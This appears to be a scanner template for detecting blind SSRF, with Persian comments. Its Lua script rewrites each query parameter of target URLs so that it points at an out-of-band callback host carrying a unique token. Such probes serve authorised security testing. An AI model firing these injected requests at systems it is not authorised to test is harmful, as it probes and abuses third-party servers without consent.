# 50_oob_callback_probe.yaml
meta:
  id: oob_callback_probe
  version: 1
  name: "OOB Callback Probe"
  description: "Injects a unique out-of-band callback URL to detect blind SSRF"
  author: "SSRFdevil"
  created: "2026-09-04"
  updated: "2026-09-05"
  rank: 110
  confidence: 95
  severity: high
  tags: [oob, blind, callback, webhook]
  references: []
  success_indicator: []
  failure_indicator:
    - "literal:<html"
    - "literal:<!DOCTYPE"
    - "literal:404"
    - "literal:Access Denied"
    - "literal:Forbidden"
    - "literal:Internal Admin Interface"

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}

        -- اگر OOB فعال نباشد، هیچ payloadی نساز
        if oob_base == nil or oob_base == "" then
            return results
        end

        for _, target in ipairs(targets) do
            local base_url = target.url

            for _, param in ipairs(target.params) do
                if param.location == "Query" then
                    local token = oob_token()

                    -- اگر توکن ساخته نشد، این پارامتر را رد کن
                    if token == nil or token == "" then
                        goto continue
                    end

                    local payload_vector = oob_base .. "/" .. token
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    local new_url = base_url

                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end

                    table.insert(results, {
                        url = new_url,
                        method = target.method or "GET",
                        oob_token = token
                    })
                end
                ::continue::
            end
        end

        return results
    end
